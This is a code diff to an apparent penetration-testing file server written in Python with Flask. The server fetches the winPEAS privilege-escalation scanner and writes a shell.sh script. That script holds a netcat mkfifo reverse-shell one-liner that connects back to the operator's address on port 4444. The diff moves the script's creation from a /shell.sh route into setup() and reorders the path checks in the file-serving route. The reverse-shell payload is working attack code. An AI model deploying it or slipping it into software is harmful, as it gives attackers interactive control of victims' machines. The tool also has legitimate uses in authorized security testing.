@@ -45,12 +45,12 @@ def dir_listing(req_path):
 
     logHeaders(args.verbose, request)
 
-    if os.path.exists(req_path):
-        logger.debug("{0} {1} - /{2} {3}".format(request.remote_addr, str(request.method), req_path, "200 OK"))
-        return send_file(req_path)
-    elif os.path.isfile(abs_path):
+    if os.path.exists(abs_path):
         logger.debug("{0} {1} - /{2} {3}".format(request.remote_addr, str(request.method), req_path, "200 OK"))
         return send_file(abs_path)
+    elif os.path.isfile(req_path):
+        logger.debug("{0} {1} - /{2} {3}".format(request.remote_addr, str(request.method), req_path, "200 OK"))
+        return send_file(req_path)
     else:
         logger.error("{0} {1} - /{2} {3}".format(request.remote_addr, str(request.method), req_path, "404 Not Found"))
         return abort(404)
@@ -67,16 +67,6 @@ def decode_base64(encoded):
         logger.error('Failed to parse Base64')
 
     return json.dumps({}), 200, {}
-
-# Creats a reverse shell script and sends it back
-@api.route('/shell.sh')
-def shell():
-    shellFile = 'shell.sh'
-    logHeaders(args.verbose, request)
-    shellFile = open(shellFile, "w")
-    shellFile.writelines("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} 4444 >/tmp/f".format(args.address))
-    shellFile.close()
-    return send_file(shellFile)
 
 # Logs each header in the request if enabled
 def logHeaders(verbose, request):
@@ -96,6 +86,10 @@ def setup():
         response = requests.get('https://github.com/peass-ng/PEASS-ng/releases/latest/download/winpeasany.exe')
         with open(winpeasFile, mode='wb') as file:
             file.write(response.content)
+    
+    shellFile = 'shell.sh'
+    with  open(shellFile, mode='w') as file:
+        file.writelines("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} 4444 >/tmp/f".format(args.address))
 
 if __name__ == '__main__':
     from waitress import serve
